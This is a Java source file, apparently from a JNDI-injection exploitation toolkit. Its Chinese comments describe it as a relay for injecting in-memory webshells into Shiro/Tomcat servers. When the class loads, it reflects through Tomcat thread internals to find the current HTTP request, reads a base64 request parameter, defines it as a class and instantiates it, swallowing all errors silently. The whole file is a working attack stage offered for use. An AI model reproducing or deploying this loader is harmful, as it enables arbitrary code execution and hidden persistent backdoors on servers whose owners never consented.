package com.qi4l.jndi.template;

/**
 * 在 shiro 等环境下，直接打内存马会出现 header 太长的问题，需要进行一个中转
 * 从 Parameter 默认为 "dc" 中取字符进行 base64 decode，然后进行类加载，参考 ShiroAttack2
 * 内存马 class 文件可以自行生成，base64 编码后由 request body 中的 dc 参数传递
 */
public class DefineClassFromParameter {

    public static String parameter;

    static {
        try {
            boolean                 flag  = false;
            ThreadGroup             group = Thread.currentThread().getThreadGroup();
            java.lang.reflect.Field f     = group.getClass().getDeclaredField("threads");
            f.setAccessible(true);
            Thread[] threads = (Thread[]) f.get(group);
            for (int i = 0; i < threads.length; i++) {
                try {
                    Thread t = threads[i];
                    if (t == null) continue;
                    String str = t.getName();
                    if (str.contains("exec") || !str.contains("http")) continue;
                    f = t.getClass().getDeclaredField("target");
                    f.setAccessible(true);
                    Object obj = f.get(t);
                    if (!(obj instanceof Runnable)) continue;
                    f = obj.getClass().getDeclaredField("this$0");
                    f.setAccessible(true);
                    obj = f.get(obj);
                    try {
                        f = obj.getClass().getDeclaredField("handler");
                    } catch (NoSuchFieldException e) {
                        f = obj.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                    }
                    f.setAccessible(true);
                    obj = f.get(obj);
                    try {
                        f = obj.getClass().getSuperclass().getDeclaredField("global");
                    } catch (NoSuchFieldException e) {
                        f = obj.getClass().getDeclaredField("global");
                    }
                    f.setAccessible(true);
                    obj = f.get(obj);
                    f = obj.getClass().getDeclaredField("processors");
                    f.setAccessible(true);
                    java.util.List processors = (java.util.List) (f.get(obj));
                    for (int j = 0; j < processors.size(); ++j) {
                        Object processor = processors.get(j);
                        f = processor.getClass().getDeclaredField("req");
                        f.setAccessible(true);

                        Object req     = f.get(processor);
                        Object note    = req.getClass().getMethod("getNote", new Class[]{Integer.TYPE}).invoke(req, new Object[]{new Integer(1)});
                        String payload = (String) note.getClass().getMethod("getParameter", new Class[]{String.class}).invoke(note, new Object[]{parameter});
                        if (payload != null && !payload.isEmpty()) {
                            byte[]                   classBytes = base64Decode(payload);
                            java.lang.reflect.Method method     = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                            method.setAccessible(true);
                            Class clazz = (Class) method.invoke(DefineClassFromParameter.class.getClassLoader(), classBytes, new Integer(0), new Integer(classBytes.length));
                            clazz.newInstance();
                        }

                        flag = true;
                    }
                    if (flag) break;
                } catch (Exception ignored) {
                }
            }

        } catch (Exception ignored) {
        }
    }

    public static byte[] base64Decode(String bs) {
        Class  base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", new Class[]{}).invoke(null, (Object[]) null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception ignored) {
            }
        }

        return value;
    }
}
